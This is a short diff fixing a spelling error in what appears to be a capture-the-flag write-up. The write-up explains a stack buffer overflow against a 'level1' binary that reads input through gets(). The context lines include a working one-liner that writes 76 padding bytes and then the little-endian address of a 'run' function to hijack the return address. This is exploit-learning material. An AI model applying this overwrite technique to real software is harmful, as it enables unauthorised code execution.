@@ -94,7 +94,7 @@ Breakpoint 2, 0xb7e91e40 in gets () from /lib/i386-linux-gnu/libc.so.6
 ``` 
 The first double word of data is the address of the return value of the main function. Thus, we know that, just before filling out the buffer, we need to write out the address of the `run` function to call it.
 
-We write 76 A and then the address of the `run` function in reverse order becuase of the little endian of the system. 
+We write 76 A and then the address of the `run` function in reverse order because of the little endian of the system. 
 ```bash
 python -c 'print("A"*76 + "\x44\x84\x04\x08")' > attack.txt; ./level1 < attack.txt; rm -rf attack.txt
 ```
